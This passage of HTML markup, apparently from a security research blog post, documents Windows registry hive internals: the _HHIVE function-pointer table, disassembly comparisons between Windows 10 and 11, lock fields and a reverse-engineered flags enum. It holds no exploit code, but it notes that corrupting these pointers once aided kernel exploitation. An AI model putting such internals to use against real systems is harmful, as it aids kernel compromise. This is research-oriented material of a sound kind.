 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c46 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Pointer value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33 tTszyzmaCA-c52&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c4 tTszyzmaCA-c46 tTszyzmaCA-c5 tTszyzmaCA-c7&quot;&gt;Operation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;GetCellRoutine&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpGetCellPaged or HvpGetCellFlat&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Translate cell index to virtual address&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;ReleaseCellRoutine&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;HvpReleaseCellPaged or HvpReleaseCellFlat&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;Release&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;previously translated cell index&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Allocate&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;CmpAllocate&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Allocate kernel memory within global registry quota&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Free&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;CmpFree&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Free kernel memory within global registry quota&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;FileWrite&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;CmpFileWrite&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Write data to hive file&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;tTszyzmaCA-c32&quot;&gt;&lt;td class=&quot;tTszyzmaCA-c51&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;FileRead&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c47&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;CmpFileRead&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;tTszyzmaCA-c33&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;tTszyzmaCA-c18&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Read data from hive file&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;As we can see, these functions provide the basic functionality of operating on kernel memory, cell indexes, and the hive file. In my opinion, the most important of them is GetCellRoutine, whose typical destination, HvpGetCellPaged, performs the &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c44&quot;&gt;cell map walk&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;in order to translate a cell index into the corresponding address within the hive mapping.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;It is natural to think that these function pointers could prove useful for exploitation if an attacker managed to corrupt them through a buffer overflow or a use-after-free condition. That was indeed the case in Windows 10 and earlier, but in Windows 11, these calls are now de-virtualized, and most call sites reference one of HvpGetCellPaged / HvpGetCellFlat and HvpReleaseCellPaged / HvpReleaseCellFlat directly, without referring to the pointers. This is great for security, as it completely eliminates the usefulness of those fields in any offensive scenarios.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Here&amp;#39;s an example of a GetCellRoutine call in Windows 10, disassembled in IDA Pro:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3E0Bw87KBmn8O14C3MXMvGS_OKgSuW6gv0KYqUXTA1DroYV-fPxaRxwbQYYKEMVIdfJd2XJ7MSTkUhiKl9JCPoOWByIsuSwylGe5bs08UbSRYn9jZQxIizAVJgAxMJGC6R01h2wFMeeypsKrMgPYbbdTNJhjYdEvFhzxUmVV5n9iYSY32X8WOU5fZAYk/s1200/image11.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3E0Bw87KBmn8O14C3MXMvGS_OKgSuW6gv0KYqUXTA1DroYV-fPxaRxwbQYYKEMVIdfJd2XJ7MSTkUhiKl9JCPoOWByIsuSwylGe5bs08UbSRYn9jZQxIizAVJgAxMJGC6R01h2wFMeeypsKrMgPYbbdTNJhjYdEvFhzxUmVV5n9iYSY32X8WOU5fZAYk/s1200/image11.png&quot; border=&quot;0&quot; alt=&quot;IDA Pro disassembly view showing assembly code related to the GetCellRoutine call in Windows 10, featuring mov and lea instructions, cross-references to CmSetValueKey, and culminating in a call to __guard_dispatch_icall.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;IDA Pro disassembly view showing assembly code related to the GetCellRoutine call in Windows 10, featuring mov and lea instructions, cross-references to CmSetValueKey, and culminating in a call to __guard_dispatch_icall.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;And the same call in Windows 11:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioyK0W61kSNa18Sj0Habbo8I5B3pqJSjtWE4MceBYzi3QHsS-m4tvgi9eh16DETfrouRwahyfrStRpRR_eDRf0-_V0Ix8o-Y544klhS9Fy3iR1sOXnmF1gstjmgI-5S-Ybv1jmTH0c0oE0PQJXA6CbFD2nIRrXJ4SnKkif7NZ7OUKVVXc2nRotmvqe0Y0/s1200/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioyK0W61kSNa18Sj0Habbo8I5B3pqJSjtWE4MceBYzi3QHsS-m4tvgi9eh16DETfrouRwahyfrStRpRR_eDRf0-_V0Ix8o-Y544klhS9Fy3iR1sOXnmF1gstjmgI-5S-Ybv1jmTH0c0oE0PQJXA6CbFD2nIRrXJ4SnKkif7NZ7OUKVVXc2nRotmvqe0Y0/s1200/image3.png&quot; border=&quot;0&quot; alt=&quot;IDA Pro disassembly of a GetCellRoutine call implementation in Windows 11. The assembly code shows register setup (mov, lea), a test instruction followed by a conditional jump (jz). Depending on the condition, the code either calls HvlpGetCellFlat and jumps onward, or calls HvlpGetCellPaged. Cross-references to CmSetValueKey are also shown&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.7w2oxfishttj&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Hive load failure information&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;This is a pointer to a public _HIVE_LOAD_FAILURE structure, which is passed as the first argument to the SetFailureLocation function every time an error occurs while loading a hive. It can be helpful in tracking which validity checks have failed for a given hive, without having to trace the entire loading process.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.av9ihvlfjyf6&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Base block&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A pointer to a copy of the hive header, represented by the _HBASE_BLOCK structure.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.uz7wnyuivg4m&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Synchronization locks&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;There are two locks with the following purpose:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_q2cw7ye43y3y-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;FlusherLock &amp;ndash; synchronizes access to the hive between clients changing data inside cells and the flusher thread;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;WriterLock &amp;ndash; synchronizes access to the hive between writers that modify the bin/cell layout.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;They are officially of type _CMSI_RW_LOCK, but they boil down to _EX_PUSH_LOCK, and they are used with standard kernel APIs such as ExAcquirePushLockSharedEx.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.ipdvewjq58o7&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Dirty blocks information&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Between offsets 0x58 and 0x84, _HHIVE stores several data structures representing the state of synchronization between the in-memory and on-disk instances of the hive.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;tTszyzmaCA-c21 tTszyzmaCA-c13&quot; id=&quot;h.7d6344sefqah&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c35 tTszyzmaCA-c4&quot;&gt;Hive flags&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;First of all, there are two flags at offset 0x8C that indicate if the hive mapping is flat and if the hive is read-only. Secondly, there is a 32-bit HiveFlags member that stores further flags which aren&amp;#39;t (as far as I know) included in any public Windows symbols. I have managed to reverse-engineer and infer the meaning of the constants I have observed, resulting in the following enum:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;enum&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_HV_HIVE_FLAGS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_VOLATILE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_NOLAZYFLUSH&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_PRELOADED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_IS_UNLOADING&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_COMPLETE_UNLOAD_STARTED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_ALL_REFS_DROPPED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_ON_PRELOADED_LIST&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_FILE_READ_ONLY&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x8000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_SECTION_BACKED&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x20000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_DIFFERENCING&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x80000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HIVE_IMMUTABLE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x100000&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
